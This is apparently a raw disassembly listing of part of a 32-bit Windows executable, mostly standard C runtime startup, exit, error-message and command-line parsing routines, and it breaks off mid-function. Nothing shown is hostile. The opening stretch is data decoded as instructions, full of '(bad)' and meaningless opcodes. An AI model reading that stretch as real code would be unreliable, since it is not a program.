  42436c:	adc    BYTE PTR [ecx+eiz*1-0x4f],dh
  424370:	(bad)  
  424371:	mov    al,0xab
  424373:	cmp    dl,BYTE PTR [ecx+0xe]
  424376:	sub    al,0x5
  424378:	aas    
  424379:	cmp    eax,0x1c6b819f
  42437e:	or     al,0x8c
  424380:	adc    ecx,ebx
  424382:	ss pusha 
  424384:	lea    edi,[edx+0x76322ff]
  42438a:	jne    0x4243e5
  42438c:	not    BYTE PTR [ecx-0x6f9f4555]
  424392:	bound  ecx,QWORD PTR [ebx+0x42]
  424395:	cdq    
  424396:	mov    bl,0xa9
  424398:	xchg   ebx,ebx
  42439a:	push   0xfdfaaf39
  42439f:	int    0xb3
  4243a1:	mov    dl,0x66
  4243a3:	push   esp
  4243a4:	iret   
  4243a5:	xchg   BYTE PTR [esp-0x409615bd],dh
  4243ac:	int3   
  4243ad:	jae    0x424337
  4243af:	adc    esi,DWORD PTR [ebx]
  4243b1:	jo     0x4243c9
  4243b3:	pop    esp
  4243b4:	(bad)  
  4243b5:	push   ds
  4243b6:	popf   
  4243b7:	mov    dl,0x88
  4243b9:	leave  
  4243ba:	ds mov dl,0x49
  4243bd:	pop    edi
  4243be:	ins    BYTE PTR es:[edi],dx
  4243bf:	ins    BYTE PTR es:[edi],dx
  4243c0:	and    eax,0x63533afc
  4243c5:	mov    ds:0xe5151cc5,eax
  4243ca:	rol    bl,0x9
  4243cd:	mov    esp,0x3891e9ae
  4243d2:	jl     0x4243e5
  4243d4:	imul   DWORD PTR [ecx+0x62d3bc61]
  4243da:	xor    al,0x65
  4243dc:	(bad)  
  4243dd:	(bad)  
  4243de:	in     al,dx
  4243df:	mov    BYTE PTR [ecx],cl
  4243e1:	aad    0x93
  4243e3:	das    
  4243e4:	gs or  al,0x18
  4243e7:	pop    eax
  4243e8:	adc    al,0x4f
  4243eb:	mov    cl,0x9e
  4243ed:	mov    WORD PTR [ebx+eiz*1],?
  4243f0:	push   ecx
  4243f1:	mov    esi,0x491b79a1
  4243f6:	dec    edx
  4243f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243f8:	scas   eax,DWORD PTR es:[edi]
  4243f9:	jmp    0xa53ab175
  4243fe:	push   0x0
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
